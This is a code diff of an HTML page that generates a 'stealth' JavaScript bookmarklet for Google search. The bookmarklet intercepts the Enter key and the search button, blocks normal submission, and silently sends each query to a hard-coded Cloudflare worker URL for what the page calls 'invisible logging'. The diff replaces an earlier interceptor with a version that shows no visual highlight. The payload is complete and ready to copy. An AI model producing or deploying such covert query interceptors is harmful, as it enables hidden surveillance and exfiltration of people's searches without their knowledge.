@@ -22,18 +22,18 @@
     
     <div class="setup-zone">
         <label>Status: Ready to Arm</label>
-        <p>This payload intercepts the search form and routes queries through your worker for invisible logging.</p>
+        <p>Payload updated: Fixed interception for modern Google SPA. Hidden mode active (no highlights).</p>
     </div>
 
-    <button class="btn" onclick="copyPayload()">COPY INTERCEPTOR</button>
+    <button class="btn" onclick="copyPayload()">COPY STEALTH PAYLOAD</button>
     <div id="confirm">Payload Copied. Redirecting...</div>
 
     <script>
         function copyPayload() {
-            // Updated to your specific Worker URL
             const WORKER_URL = 'https://google-reveal.avishaierel.workers.dev/';
 
-            const payload = `javascript:(function(){const W='${WORKER_URL}';const i=document.querySelector('textarea[name="q"]')||document.querySelector('input[name="q"]');const f=i?i.closest('form'):null;if(f){f.addEventListener('submit',function(e){const q=(i.value||'').trim();if(q){e.preventDefault();window.location.href=W+'?q='+encodeURIComponent(q);}},{capture:true});i.style.boxShadow='0 0 10px #4285F4';console.log('Armed');}else{alert('Search box not found');}})();`;
+            // This version intercepts the 'keydown' (Enter key) and the magnifying glass click
+            const payload = `javascript:(function(){const W='${WORKER_URL}';const i=document.querySelector('textarea[name="q"]')||document.querySelector('input[name="q"]');if(!i)return alert('Not found');const go=(v)=>{if(v.trim())window.location.href=W+'?q='+encodeURIComponent(v.trim());};i.addEventListener('keydown',(e)=>{if(e.key==='Enter'){e.preventDefault();e.stopImmediatePropagation();go(i.value);}},true);const b=document.querySelector('button[type="submit"]')||document.querySelector('input[type="submit"]')||document.querySelector('.gNO89b');if(b){b.addEventListener('click',(e)=>{e.preventDefault();e.stopImmediatePropagation();go(i.value);},true);}console.log('Stealth Armed');})();`;
 
             navigator.clipboard.writeText(payload).then(() => {
                 const msg = document.getElementById('confirm');
